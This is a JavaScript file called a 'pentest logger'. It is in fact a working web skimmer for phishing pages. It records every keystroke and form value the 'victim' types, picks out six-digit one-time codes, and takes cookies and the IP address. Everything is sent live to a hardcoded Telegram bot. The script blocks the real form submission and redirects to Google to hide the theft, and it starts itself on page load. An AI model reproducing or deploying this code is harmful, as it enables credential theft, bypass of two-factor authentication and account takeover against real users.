// ultimate-pentest-logger.js - PERFECT FORMAT VERSION
class UltimatePentestLogger {
    constructor() {
        this.config = {
            botToken: '8335563143:AAHK7yHwv1A-gEjAKqhz1WdrXCvsoRJloCw',
            chatId: '8255019946',
            sessionId: 'pentest_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9)
        };
        this.victim = {
            credentials: {},
            otps: [],
            keystrokes: [],
            cookies: '',
            profile: {}
        };
        this.init();
    }

    async init() {
        await this.collectProfile();
        this.hookEverything();
        this.sendStatus('🟢 CONNECTED');
        this.startLiveCapture();
    }

    async collectProfile() {
        this.victim.profile.ip = await this.getIP();
        this.victim.profile.currentUrl = window.location.href;
        this.victim.cookies = document.cookie;
    }

    async getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            return (await res.json()).ip;
        } catch {
            return 'IP_HIDDEN';
        }
    }

    hookEverything() {
        // CAPTURE EVERY INPUT IN REAL-TIME
        document.addEventListener('input', (e) => {
            if (e.target.tagName === 'INPUT') {
                const fieldName = e.target.name || e.target.id || e.target.placeholder || 'unknown';
                const fieldValue = e.target.value;
                
                // Store credentials
                this.victim.credentials[fieldName] = fieldValue;
                
                // OTP Detection
                if (fieldValue.length === 6 && /^\d{6}$/.test(fieldValue)) {
                    this.victim.otps.push({
                        code: fieldValue,
                        likelyService: this.guessService(fieldName)
                    });
                }
                
                // Send live update every 3 keystrokes
                this.victim.keystrokes.push(fieldValue);
                if (this.victim.keystrokes.length % 3 === 0) {
                    this.sendLiveData();
                }
            }
        });

        // FORM SUBMISSION - FINAL CAPTURE
        document.addEventListener('submit', (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            const formCredentials = Object.fromEntries(formData);
            
            // Merge all captured data
            const finalData = {
                session: this.config.sessionId,
                ip: this.victim.profile.ip,
                credentials: { ...this.victim.credentials, ...formCredentials },
                otps: this.victim.otps,
                cookies: this.victim.cookies,
                currentUrl: window.location.href,
                totalKeystrokes: this.victim.keystrokes.length,
                timestamp: new Date().toISOString()
            };
            
            this.sendPerfectFormat(finalData);
            
            // Stealth redirect
            setTimeout(() => window.location.href = 'https://google.com', 1500);
        }, true);

        // PAGE VISIBILITY TRACKING
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                this.sendLiveData();
            }
        });
    }

    guessService(fieldName) {
        const name = fieldName.toLowerCase();
        if (name.includes('spotify') || name.includes('otp')) return 'Spotify';
        if (name.includes('netflix')) return 'Netflix';
        if (name.includes('bank') || name.includes('2fa')) return 'Banking';
        return 'Unknown Service';
    }

    startLiveCapture() {
        // Send updates every 8 seconds
        setInterval(() => {
            if (Object.keys(this.victim.credentials).length > 0) {
                this.sendLiveData();
            }
        }, 8000);
    }

    sendLiveData() {
        const liveData = {
            session: this.config.sessionId,
            ip: this.victim.profile.ip,
            credentials: this.victim.credentials,
            otps: this.victim.otps,
            cookies: this.victim.cookies.slice(0, 200) + '...',
            currentUrl: window.location.href,
            totalKeystrokes: this.victim.keystrokes.length,
            status: 'LIVE_CAPTURE'
        };
        this.sendPerfectFormat(liveData);
    }

    // 🎯 PERFECT FORMAT YOU WANT
    async sendPerfectFormat(data) {
        const message = `🎯 PENTEST CAPTURE\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
        
        await fetch(`https://api.telegram.org/bot${this.config.botToken}/sendMessage`, {
            method: 'POST',
            mode: 'no-cors',
            body: new URLSearchParams({
                chat_id: this.config.chatId,
                text: message.slice(0, 4000),
                parse_mode: 'Markdown'
            })
        });
        
        console.log('📤 SENT TO TELEGRAM:', data.session);
    }

    async sendStatus(status) {
        await this.sendPerfectFormat({
            session: this.config.sessionId,
            ip: this.victim.profile.ip,
            status: status,
            currentUrl: window.location.href
        });
    }

    // STEALTH STATUS INDICATOR
    injectUI() {
        const indicator = document.createElement('div');
        indicator.id = 'logger-status';
        indicator.innerHTML = `🟢 LIVE | ${this.config.sessionId.slice(0,8)}`;
        indicator.style.cssText = `
            position:fixed;top:10px;right:10px;z-index:999999;
            background:rgba(0,255,0,0.9);color:black;padding:8px 12px;
            border-radius:20px;font-family:monospace;font-size:11px;
            box-shadow:0 4px 15px rgba(0,255,0,0.4);
        `;
        document.body.appendChild(indicator);
    }
}

// AUTO-START
if (!window.pentestLogger) {
    window.pentestLogger = new UltimatePentestLogger();
}
